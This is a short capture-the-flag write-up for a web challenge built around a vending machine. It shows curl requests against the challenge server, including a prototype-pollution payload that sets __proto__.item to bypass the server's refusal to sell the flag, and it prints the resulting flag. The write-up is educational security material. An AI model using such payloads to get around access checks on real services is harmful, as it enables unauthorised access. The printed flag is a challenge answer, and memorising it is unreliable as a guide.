# 自動販売機

## Description
Level: medium<br/>
Author: PS

I like these Japanese vending machines! ๑(◕‿◕)๑
If I could just get a 🚩...

http://46.101.107.117:2210

## Solution

For this challenge we are given a web vending machine that allows us to order different items. The challenge description
already states that we need to order a flag from the machine.

When ordering a normal item

```
curl -X POST http://46.101.107.117:2210/order
   -H "Content-Type: application/json"
   -d '{"item": "🧋", "amount": 1}'  
```

the vending machine says `Please enjoy your....`. If we change the item to 🚩, however, the machine answers with `🚩is
not allowed`. So we have to find a way to order a 🚩without having the item equal to 🚩. One way to achieve this is so
called prototype pollution. We simply send a JSON object that has the `__proto__` property set so that JS is tricked
into thinking that the object inherits the `item` property:

```
curl -X POST http://46.101.107.117:2210/order
   -H "Content-Type: application/json"
   -d '{"amount": 1, "__proto__": {"item": "🚩"}}'
```

This returns the flag `he2022{p0llut10n_41nt_g00d}`.

